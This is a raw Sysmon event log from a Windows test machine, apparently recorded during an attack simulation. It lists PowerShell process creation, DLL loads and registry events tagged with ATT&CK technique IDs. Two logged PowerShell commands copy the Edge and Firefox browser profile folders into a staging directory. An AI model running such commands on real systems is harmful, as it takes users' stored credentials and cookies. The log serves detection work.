ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:18.084
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:18.084
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:35:18.069
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-5706-656d-dd02-000000001000}
TargetProcessId: 8772
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:18.073
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"""" -Destination \""""C:temp\..\ExternalPayloads\Edge\"""" -Force -Recurse}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:18.069
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:17 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:17.881
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:17 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2023-12-04 04:35:17.881
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:17 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:17.334
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:35:16.975
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
PipeName: \PSHost.133461381166818588.6564.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:35:16.896
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_er4ob34l.50t.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:16.865
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_er4ob34l.50t.ps1
CreationUtcTime: 2023-12-04 04:35:16.865
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:16.834
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:16.787
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:16.787
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:16.787
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:16.771
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:16.771
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:35:16.677
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-5704-656d-db02-000000001000}
TargetProcessId: 6564
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:16.681
ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
ProcessId: 6564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:APPDATA\Mozilla\Firefox\Profiles\\"""" -Destination \""""C:temp\..\ExternalPayloads\"""" -Force -Recurse}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:16.677
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:16.443
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2023-12-04 04:35:16.443
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:15.787
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:35:15.427
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
PipeName: \PSHost.133461381151989666.7028.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:35:15.334
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_mobtxuej.0ij.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:15.303
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_mobtxuej.0ij.ps1
CreationUtcTime: 2023-12-04 04:35:15.303
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:15.272
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:15.240
ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
ProcessId: 7028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
